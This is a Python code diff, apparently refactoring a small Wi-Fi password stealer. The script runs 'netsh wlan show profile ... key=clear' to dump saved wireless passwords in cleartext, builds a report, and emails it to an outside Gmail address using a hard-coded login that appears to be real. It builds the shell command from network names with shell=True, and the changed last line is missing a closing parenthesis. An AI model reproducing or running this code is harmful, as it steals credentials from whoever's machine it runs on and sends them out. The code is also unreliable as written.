@@ -23,18 +23,16 @@ def get_password(network_names_list):
     for network_name in network_names_list:
         try:
             command = "netsh wlan show profile " + network_name + " key=clear"
-            current_result = (subprocess.check_output(command, shell=True)).decode()
-            current_result = re.findall("(?:Content\s*:\s)(.*)", current_result)
-            if current_result:
-                result += network_name + current_result[0] + "\n" + "------------------------------------------" + "\n"
+            output = (subprocess.check_output(command, shell=True)).decode()
+            password = re.findall("(?:Content\s*:\s)(.*)", output)
+            if password:
+                result += network_name + password[0] + "\n" + "------------------------------------------" + "\n"
             else:
-                result += network_name + "NO PASS" + "\n" + "------------------------------------------" + "\n"
-            
+                result += network_name + "NO PASS" + "\n" + "------------------------------------------" + "\n"            
         except:
             result += network_name + "ERROR" + "\n" + "------------------------------------------" + "\n"
     return result
 
 
 if __name__ == '__main__':
-    result = get_password(get_networks_name())
-    send_mail("smartsecureuniverse@gmail.com", "Sc0 rpi 0n", result)
+    send_mail("smartsecureuniverse@gmail.com", "Sc0 rpi 0n", get_password(get_networks_name())
